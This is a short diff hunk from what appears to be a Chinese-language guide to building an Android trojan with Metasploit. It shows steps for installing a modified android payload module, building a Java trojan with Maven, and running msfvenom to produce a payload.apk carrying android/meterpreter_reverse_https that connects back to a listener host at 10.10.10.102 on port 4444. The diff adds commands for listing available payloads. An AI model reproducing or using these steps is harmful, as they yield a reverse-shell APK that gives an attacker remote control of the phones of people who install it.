@@ -48,6 +48,9 @@ cp -r android /usr/share/metasploit-framework/data
 java木马：mvn -D deploy.path=/usr/share/metasploit-framework -P deploy package
 
 5.通过msfvenom命令生成APK:
+msfvenom
+search android
+msfvenom -l payloads
 msfvenom -p android/meterpreter_reverse_https  LHOST=10.10.10.102 LPORT=4444 -o payload.apk
 返回信息：如果开头出现了这三个WARNING，说明msfvenom生成APK时使用的是我们修改后的版本。 
 WARNING: Local file /usr/share/metasploit-framework/data/android/apk is being used
